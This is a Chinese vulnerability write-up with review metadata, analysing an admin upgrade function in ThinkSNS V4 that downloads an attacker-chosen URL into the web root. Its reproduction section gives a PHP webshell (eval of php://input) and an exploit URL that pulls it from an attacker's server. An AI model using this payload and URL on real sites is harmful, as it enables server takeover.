---
source: "hatch 补库批 20260928"
product: "ThinkSNSV4"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ThinkSNS V4 后台任意文件下载导致getshell"
prerequisites: "来源所述条件，未列明部分仍待核：后台升级权限、远程file_get_contents开启、DATA_PATH/upgrade可写且PHP可执行"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-5fb4af4124c241ecc88e0b15"
entity_id: "ve-5fb4af4124c241ecc88e0b15"
schema_version: "1"
canonical: "Web安全/CMS内容/ThinkSNS/ThinkSNS V4 后台任意文件下载导致getshell.md"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台升级权限、远程file_get_contents开启、DATA_PATH/upgrade可写且PHP可执行

- **结论使用边界（1）**：标题任意文件下载易误认为信息读取，实为远程拉取并保存可执行文件。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：校验hash在写后且失败不删是核心缺陷；需固定basename和最终访问路径说明。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（3）**：与424同文源码，本文少更新日期/原出处和落点，宜合并完整者。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkSNS V4 后台任意文件下载导致getshell

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 漏洞分析

存在漏洞代码`\ts4\apps\admin\Lib\Action\UpgradeAction.class.php`中的一个函数中。

    public function step1()
    {
        $downUrl = $_GET['upurl'];
        $downUrl = urldecode($downUrl);
        $path = DATA_PATH.'/'.'upgrade/'.basename($downUrl);

        // # 备份老配置文件
        $oldConf = file_get_contents(CONF_PATH.'/thinksns.conf.php');
        file_put_contents(DATA_PATH.'/old.thinksns.conf.php', $oldConf);

        // # 下载增量包
        is_dir(dirname($path)) or mkdir(dirname($path), 0777, true);
        file_put_contents($path, file_get_contents($downUrl));
        file_exists($path) or $this->showError('下载升级包失败，请检查'.dirname($path).'目录是否可写，如果可写，请刷新重试！');

        // 验证hash判断包是否合法。
        $filename = dirname($path).'/upgrade.json';
        $data = file_get_contents($filename);
        $data = json_decode($data, false);
        if (md5_file($path) != $data->md5) {
            $this->showError('更新包校验失败，请重新执行升级.');
        }

函数

    file_put_contents — 将一个字符串写入文件
    file_get_contents — 将整个文件读入一个字符串

在这段函数中，先备份老配置文件，然后下载增量包，下载参数\$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包，导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。

### 漏洞复线

在自己的服务器创建一个 `ian.php`

    <?php   
    echo "<?php";
    echo "eval(file_get_contents('php://input'));";  
    echo "?>";  
    ?>  

登录后台，通过访问构造的url，成功下载第三方源的恶意脚本文件

`http://www.0-sec.org:8000/ts4/index.php?app=admin&mod=Upgrade&act=step1&upurl=http://你的vps:8000/ian.php`

通过直接访问url，触发代码执行，成功获取网站服务器权限。
